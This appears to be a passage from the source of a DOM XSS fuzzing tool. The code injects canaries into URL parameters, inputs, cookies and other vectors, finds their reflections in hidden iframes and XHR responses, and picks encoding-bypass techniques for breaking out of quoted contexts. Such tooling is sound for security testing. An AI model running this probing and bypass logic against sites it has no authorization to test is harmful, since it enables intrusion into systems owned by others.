/**
 * DOM XSS Hunter v4.6 — Fuzzer Core
 * Main autoFuzz orchestrator, fuzzCheck, fuzzNav, fuzzResultsExport.
 */
(function () {
  'use strict';
  const ns = window.__DOMXSS;
  const { truncate, generateCanary } = ns.utils;
  const { severityScore, manipulableScore, manipulableIcon } = ns.utils;
  const { highlightEl, injectPulseAnimation, clearHighlights, extractAndHighlight, isInputElement } = ns.highlight;
  const { analyzeReflection, findReflections, suggestPayloads, detectReflectionContext, printReflections } = ns.probe;
  const { analyzeFlows } = ns.flows;
  const CONFIG = ns.CONFIG;
  const PROBE_CHARS = ns.PROBE_CHARS;
  const ENCODING_PATTERNS = ns.ENCODING_PATTERNS;
  const CONTEXT_PAYLOADS = ns.CONTEXT_PAYLOADS;
  const VERIFY_PAYLOADS = ns.VERIFY_PAYLOADS;
  const {
    generateEncodingBypasses, prioritizeBypasses, resolveRealPayload,
    isPayloadReflected, getFillerValue, getCanaryValue, selectVerifyPayloads,
    discoverParamsFromSource, injectAndWait,
  } = ns.fuzzerHelpers;

  /**
   * AUTO-FUZZ PRINCIPAL
   *
   * Flujo automatico completo:
   *   Fase 1 -> Inyecta canary con chars especiales en todos los vectores
   *   Fase 2 -> Detecta donde se refleja y analiza encoding/contexto
   *   Fase 3 -> Para cada reflejo, genera payload contextual y re-inyecta
   *   Fase 4 -> Verifica si el payload fue interpretado (XSS confirmado)
   *   Fase 5 -> Si falla, intenta bypasses de encoding automaticamente
   */
  async function autoFuzz(options = {}) {
    const opts = {
      delayBetweenTests: CONFIG.delays.betweenTests,   // ms entre cada test
      maxPayloadsPerReflection: 5,
      tryEncodingBypasses: true,
      autoSubmitForms: false,    // true para submit automatico (mas agresivo)
      includeURL: true,          // probar via URL params
      includeHash: true,         // probar via hash
      includePostMessage: true,  // probar via postMessage
      includeCookie: true,       // probar via document.cookie
      includeWindowName: true,   // probar via window.name
      includeReferrer: true,     // detect document.referrer reflection
      ...options,
    };

    const { findings } = ns.state;

    console.clear();
    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'color:#ff00ff;font-weight:bold');
    ns.log.info('%c\u2551   \uD83E\uDD16 AUTO-FUZZ \u2014 Fuzzing autom\u00e1tico end-to-end          \u2551', 'color:#ff00ff;font-weight:bold');
    ns.log.info('%c\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d', 'color:#ff00ff;font-weight:bold');
    ns.log.info(`\uD83D\uDCCD ${location.href}`);
    ns.log.info(`\u23F1\uFE0F  Delay: ${opts.delayBetweenTests}ms | Max payloads: ${opts.maxPayloadsPerReflection}`);
    ns.log.info('');

    injectPulseAnimation();
    clearHighlights();

    const fuzzResults = {
      timestamp: new Date().toISOString(),
      url: location.href,
      vectorsTested: [],
      reflections: [],
      confirmed: [],
      bypasses: [],
    };

    // ===================================
    // FASE 1: Generar canary UNICO por vector e inyectar
    // ===================================
    ns.log.info('%c\u2550\u2550 FASE 1: Inyecci\u00f3n de canaries (uno por vector) \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');

    // Guardar params originales ANTES de que replaceState los cambie
    const savedOriginalParams = [];
    for (const [k, v] of new URL(location.href).searchParams.entries()) {
      savedOriginalParams.push([k, v]);
    }
    const savedOriginalHash = location.hash.replace(/^#/, '');

    // Pre-cache external scripts that reference location (for document.write mock + re-eval + param discovery)
    const _extScriptCache = new Map();
    try {
      for (const sc of document.querySelectorAll('script[src]')) {
        try {
          const u = new URL(sc.src, location.href);
          if (u.origin !== location.origin) continue;
          const resp = await fetch(sc.src, { credentials: 'same-origin' });
          const code = await resp.text();
          if (code.length > 100000) continue;
          if (/location\.|URLSearchParams|searchParams|\.search\b|\.hash\b|\.get\s*\(/.test(code)) {
            _extScriptCache.set(sc.src, code);
          }
        } catch (e) { ns.log.debug(e.message); }
      }
    } catch (e) { ns.log.debug(e.message); }
    ns._extScriptCache = _extScriptCache;
    if (_extScriptCache.size > 0) {
      ns.log.info(`   %c📜 ${_extScriptCache.size} external script(s) reference location (cached for re-eval)`, 'color:#ff6600');
    }

    // Recopilar vectores
    const vectors = [];

    // 1a. Inputs del DOM
    const inputSelector = 'input[type="text"], input[type="search"], input[type="url"], ' +
      'input[type="email"], input[type="tel"], input:not([type]), ' +
      'textarea, [contenteditable="true"]';
    document.querySelectorAll(inputSelector).forEach(el => {
      const origVal = (el.contentEditable === 'true') ? el.textContent : el.value;
      vectors.push({
        type: 'input', element: el,
        name: el.name || el.id || el.tagName.toLowerCase(),
        autoSubmit: opts.autoSubmitForms,
        originalValue: origVal || '',   // valor ANTES de inyectar canary
      });
    });
    ns.log.info(`   \uD83D\uDCDD ${vectors.filter(v => v.type === 'input').length} input(s)`);

    // 1b. URL params
    if (opts.includeURL) {
      const existingKeys = new Set();
      for (const key of new URL(location.href).searchParams.keys()) {
        vectors.push({ type: 'url-param', param: key, name: `URL ?${key}=` });
        existingKeys.add(key);
      }

      // -- 1b+a. PARAMS FROM GET FORM INPUTS --
      // GET form submission turns input names into URL params in location.search.
      // JS on the page may read these via URLSearchParams → DOM XSS vectors.
      // Only create url-param vectors for GET forms (POST fields stay in body).
      const formDerivedParams = new Set();
      for (const form of document.querySelectorAll('form')) {
        const method = (form.method || 'GET').toUpperCase();
        if (method !== 'GET') continue; // POST fields don't become URL params
        for (const inp of form.querySelectorAll('input[name], select[name], textarea[name]')) {
          const name = inp.name;
          if (!name || existingKeys.has(name) || formDerivedParams.has(name)) continue;
          formDerivedParams.add(name);
          vectors.push({ type: 'url-param', param: name, name: `URL ?${name}= (from GET form)` });
          existingKeys.add(name);
        }
      }
      if (formDerivedParams.size > 0) {
        ns.log.info(`   %c\uD83D\uDCDD ${formDerivedParams.size} param(s) from GET form inputs: %c${[...formDerivedParams].join(', ')}`,
          'color:#ff6600;font-weight:bold', 'color:#ffaa00');
      }

      // -- 1b+b. DESCUBRIMIENTO DE PARAMETROS OCULTOS --
      // Buscar en el codigo fuente analizado por triage nombres de parametros
      // que la pagina lee pero que NO estan en la URL actual.
      const discoveredParams = discoverParamsFromSource(existingKeys);

      if (discoveredParams.size > 0) {
        for (const param of discoveredParams) {
          vectors.push({ type: 'url-param', param, name: `URL ?${param}= (discovered)`, discovered: true });
          existingKeys.add(param);
        }
        ns.log.info(`   %c\uD83D\uDD0D ${discoveredParams.size} param(s) descubiertos en c\u00f3digo: %c${[...discoveredParams].join(', ')}`,
          'color:#ff6600;font-weight:bold', 'color:#ffaa00');
      }

      ns.log.info(`   \uD83D\uDD17 ${existingKeys.size} URL param(s) total`);
    }

    // 1c. Hash
    if (opts.includeHash) {
      vectors.push({ type: 'hash', name: 'URL #hash' });
      ns.log.info('   #\uFE0F\u20E3  Hash');
    }

    // 1d. PostMessage
    if (opts.includePostMessage) {
      vectors.push({ type: 'postmessage', name: 'postMessage' });
      ns.log.info('   \uD83D\uDCE8 postMessage');
    }

    // 1e. Cookie — page JS may read document.cookie and reflect it
    if (opts.includeCookie) {
      vectors.push({ type: 'cookie', name: 'document.cookie' });
      ns.log.info('   \uD83C\uDF6A Cookie');
    }

    // 1f. window.name — cross-origin data channel
    if (opts.includeWindowName) {
      vectors.push({ type: 'window-name', name: 'window.name' });
      ns.log.info('   \uD83C\uDFF7\uFE0F  window.name');
    }

    // 1g. document.referrer — detect if referrer is reflected in page output
    if (opts.includeReferrer) {
      try {
        const ref = document.referrer;
        if (ref) {
          const refHost = new URL(ref).hostname;
          if (refHost && document.documentElement.innerHTML.includes(refHost)) {
            vectors.push({ type: 'referrer', name: 'document.referrer (reflected)', referrerValue: ref });
            ns.log.info('   \uD83D\uDD17 document.referrer (reflected in page)');
          }
        }
      } catch (e) { ns.log.debug(e.message); }
    }

    // -- Generar canary UNICO por vector --
    // Duplicate critical chars so each appears TWICE in the canary.
    // If server uses string .replace('<', '&lt;') (first occurrence only),
    // the first instance gets encoded but the second survives raw —
    // enabling partial-encoding detection and sacrificial prefix bypass.
    const dualChars = ['<', '>', '"', "'"];
    const charString = Object.keys(PROBE_CHARS)
      .map(ch => dualChars.includes(ch) ? ch + ch : ch)
      .join('');
    for (const v of vectors) {
      const uid = Math.random().toString(36).substring(2, 7);
      v.canary = {
        id: uid,
        base: `xSs${uid}`,
        full: `xSs${uid}${charString}xSs${uid}`,
        chars: charString,
        ts: Date.now(),
      };
    }

    // Guardar un canary "maestro" para cross-page
    const masterCanary = vectors[0]?.canary || generateCanary();
    window.__domxss_lastCanary = masterCanary;

    // Build injectedInputs set BEFORE injection loop (needed for filtering)
    const injectedInputs = new Set(vectors.filter(v => v.type === 'input' && v.element).map(v => v.element));
    const vectorReflectionMap = new Map(); // vector -> [reflections]
    const earlyReflections = []; // reflections found during Phase 1

    ns.log.info(`\n   Inyectando ${vectors.length} canaries \u00fanicos...`);
    for (const v of vectors) {
      await injectAndWait(v, v.canary.full, 200, _extScriptCache);
      fuzzResults.vectorsTested.push(v.name);
      ns.log.info(`   \u2705 ${v.name} \u2192 %c${v.canary.base}`, 'color:#888');

      // For url-param and hash vectors, detect reflections IMMEDIATELY after injection.
      // Each subsequent url-param injection calls replaceState + re-eval, which clears
      // the document.write mock container. If we wait until Phase 2, only the LAST
      // url-param's document.write output survives — all previous DOM XSS reflections are lost.
      if (v.type === 'url-param' || v.type === 'hash') {
        // Debug: check document.write capture container
        const docWriteCapture = document.getElementById('__domxss_docwrite_capture');
        const captureHTML = docWriteCapture ? docWriteCapture.innerHTML : '';
        const hasDocWriteContent = captureHTML.includes(v.canary.base);
        if (docWriteCapture) {
          ns.log.debug(` docwrite container: ${captureHTML.length} chars, has canary: ${hasDocWriteContent}${captureHTML.length > 0 ? ', preview: ' + captureHTML.substring(0, 120) : ''}`);
        }

        const refs = findReflections(v.canary).filter(r => {
          if (r.domElement && injectedInputs.has(r.domElement)) return false;
          if (r.domElement && isInputElement(r.domElement) && r.type === 'attribute' && r.attrName === 'value') return false;
          return true;
        });

        if (refs.length > 0) {
          for (const ref of refs) {
            ref.sourceVector = v;
            ref.sourceName = v.name;
            // Mark if this came from document.write (DOM XSS)
            if (hasDocWriteContent && ref.domElement) {
              const capture = document.getElementById('__domxss_docwrite_capture');
              if (capture && capture.contains(ref.domElement)) {
                ref.isDocumentWrite = true;
                ref.sourceName = `${v.name} \u2192 document.write`;
              }
            }
          }
          vectorReflectionMap.set(v, refs);
          earlyReflections.push(...refs);
          ns.log.info(`      \uD83D\uDCA1 ${refs.length} DOM reflection(s) detected immediately${hasDocWriteContent ? ' (via document.write)' : ''}`);
        }
      }
    }

    await new Promise(r => setTimeout(r, opts.delayBetweenTests));

    // Restore original URL (Phase 1 replaceState left canaries in the URL bar)
    try {
      const restoreUrl = new URL(location.origin + location.pathname);
      for (const [k, val] of savedOriginalParams) restoreUrl.searchParams.set(k, val);
      if (savedOriginalHash) restoreUrl.hash = savedOriginalHash;
      history.replaceState(null, '', restoreUrl.toString());
    } catch (e) { ns.log.debug(e.message); }

    // ===================================
    // FASE 2: Detectar reflejos por canary ID -> correlacionar source
    // ===================================
    ns.log.info('\n%c\u2550\u2550 FASE 2: Detecci\u00f3n de reflejos + correlaci\u00f3n \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');

    let reflections = [...earlyReflections];

    // -- 2a. Buscar cada canary unico en el DOM (skip vectors already detected in Phase 1) --
    for (const v of vectors) {
      if (vectorReflectionMap.has(v)) continue; // Already found during Phase 1 injection

      const refs = findReflections(v.canary).filter(r => {
        // Excluir el mismo input donde lo inyectamos
        if (r.domElement && injectedInputs.has(r.domElement)) return false;
        if (r.domElement && isInputElement(r.domElement) && r.type === 'attribute' && r.attrName === 'value') return false;
        return true;
      });

      if (refs.length > 0) {
        // Anotar de que vector vino cada reflejo
        for (const ref of refs) {
          ref.sourceVector = v;
          ref.sourceName = v.name;
        }
        vectorReflectionMap.set(v, refs);
        reflections.push(...refs);
      }
    }

    ns.log.info(`   \uD83D\uDCCA Canaries inyectados: ${vectors.length} | Reflejos DOM: ${reflections.length}`);

    // -- Flow-informed intelligence: use triage source→sink flows --
    const hotFlows = findings.flows.filter(f => f.exploitability === 'likely');
    if (hotFlows.length > 0 && reflections.length === 0) {
      ns.log.info(`\n   %c\u26A1 Static analysis found ${hotFlows.length} likely flow(s) but no DOM reflections detected`, 'color:#ffaa00;font-weight:bold');
      for (const flow of hotFlows.slice(0, 3)) {
        const sinkCat = flow.sink?.category || flow.sink?.match || '?';
        const srcMatch = flow.source?.match || '?';
        ns.log.info(`      ${srcMatch} \u2192 ${sinkCat}`);
      }
      ns.log.info(`   %c\uD83D\uDCA1 TIP: For DOM XSS (document.write, innerHTML), use %cdomxss.fuzz.nav()%c for real navigation-based testing`,
        'color:#ffaa00', 'color:#ff00ff;font-weight:bold', 'color:#ffaa00');
    }

    // -- 2a-iframe. IFRAME-BASED DOM XSS DETECTION (fallback) --
    // If eval-based detection found 0 DOM reflections for url-params,
    // load the page in a hidden same-origin iframe with the canary in the URL.
    // All scripts execute naturally (document.write, innerHTML, etc.),
    // then we search the iframe's DOM for the canary. This is the most reliable
    // approach for DOM XSS and catches cases where replaceState+eval fails.
    // Include ALL url-param vectors (especially discovered ones like storeId)
    const urlParamVectors = vectors.filter(v => v.type === 'url-param');
    // Run iframe fallback for any url-param vector that has no reflections yet
    const untestedVectors = urlParamVectors.filter(v => !vectorReflectionMap.has(v));
    // Cap iframe tests to avoid hammering the server on pages with 50+ params
    const MAX_IFRAME_TESTS = 15;
    const iframeTestVectors = untestedVectors.slice(0, MAX_IFRAME_TESTS);
    if (iframeTestVectors.length > 0) {
      if (untestedVectors.length > MAX_IFRAME_TESTS) {
        ns.log.info(`\n   %c🖼️ Iframe DOM XSS detection for ${iframeTestVectors.length}/${untestedVectors.length} param(s) (capped)...`, 'color:#ff6600;font-weight:bold');
      } else {
        ns.log.info(`\n   %c🖼️ Iframe DOM XSS detection for ${iframeTestVectors.length} param(s)...`, 'color:#ff6600;font-weight:bold');
      }
      let iframeBlocked = false; // If first iframe is blocked, skip rest (same CSP applies)
      for (const v of iframeTestVectors) {
        if (iframeBlocked) break;
        const testUrl = new URL(location.origin + location.pathname);
        for (const [k, val] of savedOriginalParams) testUrl.searchParams.set(k, val);
        testUrl.searchParams.set(v.param, v.canary.full);
        let iframe = null;
        try {
          iframe = document.createElement('iframe');
          iframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
          iframe.sandbox = 'allow-same-origin allow-scripts'; // Prevent framebusting navigation
          const loaded = new Promise(resolve => {
            iframe.onload = () => resolve(true);
            iframe.onerror = () => resolve(false);
            setTimeout(() => resolve(false), CONFIG.delays.verifyTimeout);
          });
          iframe.src = testUrl.toString();
          document.body.appendChild(iframe);
          const ok = await loaded;
          if (!ok || !iframe.contentDocument) {
            ns.log.info(`      ❌ ${v.name}: iframe blocked (X-Frame-Options/CSP)`);
            iframeBlocked = true;
            try { document.body.removeChild(iframe); } catch (e) { ns.log.debug(e.message); }
            continue;
          }

          // Wait for async scripts to finish executing (800ms to give XHRs time to complete)
          await new Promise(r => setTimeout(r, CONFIG.delays.betweenTests));

          const iframeDoc = iframe.contentDocument;
          const base = v.canary.base;
          const iframeRefs = [];

          // Search attributes in iframe DOM (cap element count for huge pages)
          const allEls = iframeDoc.querySelectorAll('*');
          const elLimit = Math.min(allEls.length, 10000);
          for (let ei = 0; ei < elLimit; ei++) {
            const el = allEls[ei];
            for (const attr of el.attributes) {
              if (!attr.value.includes(base)) continue;
              if (isInputElement(el) && attr.name === 'value') continue;
              const rawHTML = el.outerHTML.substring(0, 500);
              const ctx = detectReflectionContext(el, attr.name, rawHTML);
              const anal = analyzeReflection(v.canary, attr.value, rawHTML);
              if (!attr.value.includes(v.canary.full)) {
                const quoteChar = ctx === 'html-attr-sq' ? "'" : '"';
                if (anal.stripped.includes(quoteChar) || anal.encoded.includes(quoteChar)) {
                  anal.stripped = anal.stripped.filter(c => c !== quoteChar);
                  anal.encoded = anal.encoded.filter(c => c !== quoteChar);
                  if (!anal.survived.includes(quoteChar)) anal.survived.push(quoteChar);
                  anal.encodings[quoteChar] = 'BREAKOUT (closes attribute)';
                }
              }
              iframeRefs.push({
                type: 'attribute', context: ctx, attrName: attr.name,
                element: `<${el.tagName.toLowerCase()} ${attr.name}="…">`,
                rawSample: truncate(attr.value, 200),
                analysis: anal,
                suggestions: suggestPayloads(ctx, anal.survived),
                domElement: null,
                sourceVector: v,
                sourceName: `${v.name} → DOM (iframe)`,
                isDocumentWrite: true,
              });
            }
          }

          // Search text nodes in iframe DOM
          const tw = iframeDoc.createTreeWalker(iframeDoc.body || iframeDoc.documentElement, NodeFilter.SHOW_TEXT);
          let textNode;
          let textCount = 0;
          while ((textNode = tw.nextNode()) && textCount < 5000) {
            textCount++;
            const text = textNode.textContent || '';
            if (!text.includes(base)) continue;
            const parent = textNode.parentElement;
            if (!parent || parent.tagName === 'SCRIPT' || parent.tagName === 'STYLE') continue;
            const rawHTML = parent.innerHTML || '';
            const pos = rawHTML.indexOf(base);
            const ctx = detectReflectionContext(parent, null, rawHTML, pos);
            const anal = analyzeReflection(v.canary, text, rawHTML);
            iframeRefs.push({
              type: 'text', context: ctx,
              element: `<${parent.tagName.toLowerCase()}>`,
              rawSample: truncate(text.substring(Math.max(0, text.indexOf(base) - 30), text.indexOf(base) + v.canary.full.length + 30), 200),
              analysis: anal,
              suggestions: suggestPayloads(ctx, anal.survived),
              domElement: null,
              sourceVector: v,
              sourceName: `${v.name} → DOM (iframe)`,
              isDocumentWrite: true,
            });
          }

          // Search inline scripts in iframe DOM
          iframeDoc.querySelectorAll('script:not([src])').forEach(s => {
            if (!s.textContent.includes(base)) return;
            const rawHTML = s.textContent;
            const position = rawHTML.indexOf(base);
            const ctx = detectReflectionContext(s, null, rawHTML, position);
            const anal = analyzeReflection(v.canary, rawHTML, rawHTML);
            iframeRefs.push({
              type: 'script', context: ctx,
              element: '<script> (inline)',
              rawSample: truncate(rawHTML.substring(Math.max(0, position - 50), position + v.canary.full.length + 50), 200),
              analysis: anal,
              suggestions: suggestPayloads(ctx, anal.survived),
              domElement: null,
              sourceVector: v,
              sourceName: `${v.name} → <script> (iframe)`,
              isDocumentWrite: true,
            });
          });

          // Search JS resources loaded by the iframe for canary reflections
          // (catches eval-based XSS where canary is in a JSON/JS response, not in the HTML DOM)
          try {
            const iframeScripts = iframe.contentWindow.performance.getEntriesByType('resource')
              .filter(e => e.initiatorType === 'script' || (e.name && e.name.endsWith('.js')));
            for (const scriptEntry of iframeScripts) {
              try {
                const scriptResp = await fetch(scriptEntry.name, { credentials: 'same-origin' });
                if (!scriptResp.ok) continue;
                const scriptContent = await scriptResp.text();
                if (!scriptContent.includes(base)) continue;

                // Canary found in a JS resource!
                const idx = scriptContent.indexOf(base);
                const ctxStart = Math.max(0, idx - 300);
                const ctxEnd = Math.min(scriptContent.length, idx + v.canary.full.length + 300);
                const before = scriptContent.substring(ctxStart, idx);
                const after = scriptContent.substring(idx, ctxEnd);
                const surrounding = before + after;

                // Determine JS string context from surrounding code
                let jsCtx = 'js-code';
                // Count unescaped quotes before the canary
                const dqMatches = before.match(/(?:^|[^\\])"/g) || [];
                const sqMatches = before.match(/(?:^|[^\\])'/g) || [];
                const btMatches = before.match(/(?:^|[^\\])`/g) || [];
                if (btMatches.length % 2 === 1) jsCtx = 'js-template';
                else if (sqMatches.length % 2 === 1) jsCtx = 'js-string-sq';
                else if (dqMatches.length % 2 === 1) jsCtx = 'js-string-dq';

                // Check if code-execution sinks are in the surrounding code
                const hasEval = /\beval\s*\(/.test(scriptContent) ||
                  /new\s+Function\s*\(/.test(scriptContent) ||
                  /\bsetTimeout\s*\(\s*[^,)]*(?:response|\.text\b)/.test(scriptContent) ||
                  /\bsetInterval\s*\(\s*[^,)]*(?:response|\.text\b)/.test(scriptContent) ||
                  /\.globalEval\s*\(/.test(scriptContent);
                const evalTag = hasEval ? ' (code-exec sink detected!)' : '';

                const anal = analyzeReflection(v.canary, after, surrounding);

                // For JS resources, check if backslash is escaped or usable
                // The lab scenario: server escapes quotes but NOT backslash
                // So backslash survives and can be used to neutralize the server's escape
                if (scriptContent.includes(v.canary.base)) {
                  // Check backslash behavior specifically in the JS context
                  const fullCanary = v.canary.full;
                  if (fullCanary.includes('\\') && scriptContent.includes('\\\\')) {
                    // Server might be escaping backslash — check
                    const canaryInScript = scriptContent.substring(idx, idx + fullCanary.length + 50);
                    if (!canaryInScript.includes('\\\\')) {
                      // Backslash NOT escaped by server — it survives raw
                      if (!anal.survived.includes('\\')) anal.survived.push('\\');
                      anal.stripped = anal.stripped.filter(c => c !== '\\');
                      anal.encoded = anal.encoded.filter(c => c !== '\\');
                      anal.encodings['\\'] = 'raw (not escaped by server)';
                    }
                  }
                }

                const scriptName = new URL(scriptEntry.name).pathname.split('/').pop() || scriptEntry.name;
                iframeRefs.push({
                  type: 'js-resource', context: jsCtx,
                  element: `<script src="${truncate(scriptName, 60)}">`,
                  rawSample: truncate(surrounding, 200),
                  analysis: anal,
                  suggestions: suggestPayloads(jsCtx, anal.survived),
                  domElement: null,
                  sourceVector: v,
                  sourceName: `${v.name} → JS resource${evalTag}`,
                  isDocumentWrite: true,
                  isJSResource: true,
                  hasEval,
                  scriptUrl: scriptEntry.name,
                });

                ns.log.info(`      %c🔴 ${v.name}: canary found in JS resource: ${scriptName}${evalTag}`, 'color:#ff0000;font-weight:bold');
                ns.log.info(`         Context: %c${jsCtx}%c  Survived: %c${anal.survived.join(' ')}`, 'color:#ff00ff;font-weight:bold', 'color:#ccc', 'color:#00ff00');
                if (anal.partiallyEncoded && anal.partiallyEncoded.length > 0) {
                  ns.log.info(`         %c⚡ Partial encoding detected: ${anal.partiallyEncoded.join(' ')} — first occurrence encoded, subsequent raw!`, 'color:#ff6600;font-weight:bold');
                  ns.log.info(`         💡 Sacrificial prefix bypass viable: prepend ${anal.partiallyEncoded.map(c => `"${c}"`).join(', ')} to consume first replace()`);
                }
              } catch (e) { ns.log.debug(e.message); }
            }
          } catch (e) { ns.log.debug(e.message); }

          // --- XHR/Fetch response scanning for Reflected DOM XSS ---
          // Catches patterns like: searchResults.js makes XHR to /search-results?search=INPUT
          // then eval()s the response. The canary is in the XHR response body, not the HTML DOM.
          try {
            const xhrEntries = iframe.contentWindow.performance.getEntriesByType('resource')
              .filter(e => e.initiatorType === 'xmlhttprequest' || e.initiatorType === 'fetch');

            // Pre-scan static JS files loaded by iframe for eval()/new Function() patterns
            const iframeScriptEntries = iframe.contentWindow.performance.getEntriesByType('resource')
              .filter(e => e.initiatorType === 'script' || (e.name && e.name.endsWith('.js')));
            const evalScriptCache = new Map();
            for (const se of iframeScriptEntries) {
              try {
                const sUrl = new URL(se.name);
                if (sUrl.origin !== location.origin) continue;
                const sResp = await fetch(se.name, { credentials: 'same-origin' });
                if (!sResp.ok) continue;
                const sContent = await sResp.text();
                const hasEvalSink = /\beval\s*\(/.test(sContent) ||
                  /new\s+Function\s*\(/.test(sContent) ||
                  /\bsetTimeout\s*\(\s*[^,)]*(?:response|\.text\b)/.test(sContent) ||
                  /\bsetInterval\s*\(\s*[^,)]*(?:response|\.text\b)/.test(sContent) ||
                  /\.globalEval\s*\(/.test(sContent);
                if (hasEvalSink) evalScriptCache.set(se.name, sContent);
              } catch (e) { ns.log.debug(e.message); }
            }

            const MAX_XHR_SCANS = 10;
            let xhrScanned = 0;
            for (const xhrEntry of xhrEntries) {
              if (xhrScanned >= MAX_XHR_SCANS) break;
              try {
                const xhrUrl = new URL(xhrEntry.name);
                // Skip cross-origin unless URL contains canary base
                if (xhrUrl.origin !== location.origin && !xhrEntry.name.includes(base)) continue;

                xhrScanned++;
                // Re-fetch the same URL (same query params = same server response with canary)
                const xhrResp = await fetch(xhrEntry.name, { credentials: 'same-origin' });
                if (!xhrResp.ok) continue;
                const xhrBody = await xhrResp.text();
                if (!xhrBody.includes(base)) continue;

                // Canary found in XHR/fetch response!
                const xhrIdx = xhrBody.indexOf(base);
                const xhrCtxStart = Math.max(0, xhrIdx - 300);
                const xhrCtxEnd = Math.min(xhrBody.length, xhrIdx + v.canary.full.length + 300);
                const xhrBefore = xhrBody.substring(xhrCtxStart, xhrIdx);
                const xhrAfter = xhrBody.substring(xhrIdx, xhrCtxEnd);
                const xhrSurrounding = xhrBefore + xhrAfter;

                // Check if any script file has eval() (indicates eval of this response)
                const hasEvalInScripts = evalScriptCache.size > 0;
                // Also check if response looks like eval-able content (JSON with {/[ wrapper, or JS)
                const trimmedBody = xhrBody.trimStart();
                const looksEvalable = trimmedBody.startsWith('{') || trimmedBody.startsWith('[') ||
                  trimmedBody.startsWith('var ') || trimmedBody.startsWith('(');

                // Detect JS string context (count unescaped quotes before canary)
                let xhrCtx = 'js-code';
                const xhrDqMatches = xhrBefore.match(/(?:^|[^\\])"/g) || [];
                const xhrSqMatches = xhrBefore.match(/(?:^|[^\\])'/g) || [];
                const xhrBtMatches = xhrBefore.match(/(?:^|[^\\])`/g) || [];
                if (xhrBtMatches.length % 2 === 1) xhrCtx = 'js-template';
                else if (xhrSqMatches.length % 2 === 1) xhrCtx = 'js-string-sq';
                else if (xhrDqMatches.length % 2 === 1) xhrCtx = 'js-string-dq';

                const xhrAnal = analyzeReflection(v.canary, xhrAfter, xhrSurrounding);

                // Backslash neutralization promotion:
                // If \ survived raw AND " is encoded with backslashEscape, promote " to survived.
                // Because payload \" becomes \\" (escaped-backslash + raw-quote = breakout).
                if (xhrAnal.survived.includes('\\') && xhrAnal.encoded.includes('"') &&
                    xhrAnal.encodings['"'] && xhrAnal.encodings['"'].includes('backslashEscape')) {
                  xhrAnal.encoded = xhrAnal.encoded.filter(c => c !== '"');
                  if (!xhrAnal.survived.includes('"')) xhrAnal.survived.push('"');
                  xhrAnal.encodings['"'] = 'BREAKOUT via backslash neutralization';
                }
                // Same for single quotes
                if (xhrAnal.survived.includes('\\') && xhrAnal.encoded.includes("'") &&
                    xhrAnal.encodings["'"] && xhrAnal.encodings["'"].includes('backslashEscape')) {
                  xhrAnal.encoded = xhrAnal.encoded.filter(c => c !== "'");
                  if (!xhrAnal.survived.includes("'")) xhrAnal.survived.push("'");
                  xhrAnal.encodings["'"] = 'BREAKOUT via backslash neutralization';
                }

                const xhrUrlName = xhrUrl.pathname.split('/').pop() || xhrEntry.name;
                const evalTag = hasEvalInScripts ? ' (code-exec sink detected!)' : '';
                const evalLabelTag = looksEvalable && hasEvalInScripts ? ' + code-exec' : '';

                iframeRefs.push({
                  type: 'xhr-response', context: xhrCtx,
                  element: `XHR: ${truncate(xhrUrlName, 60)}`,
                  rawSample: truncate(xhrSurrounding, 200),
                  analysis: xhrAnal,
                  suggestions: suggestPayloads(xhrCtx, xhrAnal.survived),
                  domElement: null,
                  sourceVector: v,
                  sourceName: `${v.name} → XHR response${evalLabelTag}`,
                  isDocumentWrite: true,  // Routes to iframe verify path in Phase 3
                  isXHRReflection: true,
                  hasEval: hasEvalInScripts,
                  scriptUrl: xhrEntry.name,
                });

                ns.log.info(`      %c🔴 ${v.name}: canary found in XHR response: ${xhrUrlName}${evalTag}`, 'color:#ff0000;font-weight:bold');
                ns.log.info(`         Context: %c${xhrCtx}%c  Survived: %c${xhrAnal.survived.join(' ')}`, 'color:#ff00ff;font-weight:bold', 'color:#ccc', 'color:#00ff00');
                if (xhrAnal.partiallyEncoded && xhrAnal.partiallyEncoded.length > 0) {
                  ns.log.info(`         %c⚡ Partial encoding detected: ${xhrAnal.partiallyEncoded.join(' ')} — first occurrence encoded, subsequent raw!`, 'color:#ff6600;font-weight:bold');
                  ns.log.info(`         💡 Sacrificial prefix bypass viable: prepend ${xhrAnal.partiallyEncoded.map(c => `"${c}"`).join(', ')} to consume first replace()`);
                }
                if (xhrAnal.encodings['"'] === 'BREAKOUT via backslash neutralization' ||
                    xhrAnal.encodings["'"] === 'BREAKOUT via backslash neutralization') {
                  ns.log.info(`         %c⚡ Backslash neutralization: \\ survives + quote escape is bypassable!`, 'color:#ff0000;font-weight:bold');
                }
              } catch (e) { ns.log.debug(e.message); }
            }
          } catch (e) { ns.log.debug(e.message); }

          if (iframeRefs.length > 0) {
            ns.log.info(`      %c💡 ${v.name}: ${iframeRefs.length} reflection(s) found via iframe!`, 'color:#ff00ff;font-weight:bold');
            for (const ref of iframeRefs) {
              const typeLabel = ref.isJSResource ? 'JS' : 'DOM';
              ns.log.info(`         ${ref.context} in ${ref.element} [${ref.attrName || ref.type}] (${typeLabel})`);
            }
            reflections.push(...iframeRefs);
            vectorReflectionMap.set(v, iframeRefs);
          } else {
            ns.log.info(`      ⚪ ${v.name}: no reflections`);
          }
        } catch (e) {
          ns.log.info(`      ❌ ${v.name}: iframe error: ${e.message}`);
        } finally {
          // Always clean up iframe
          if (iframe && iframe.parentNode) {
            try { iframe.parentNode.removeChild(iframe); } catch (e) { ns.log.debug(e.message); }
          }
        }
      }
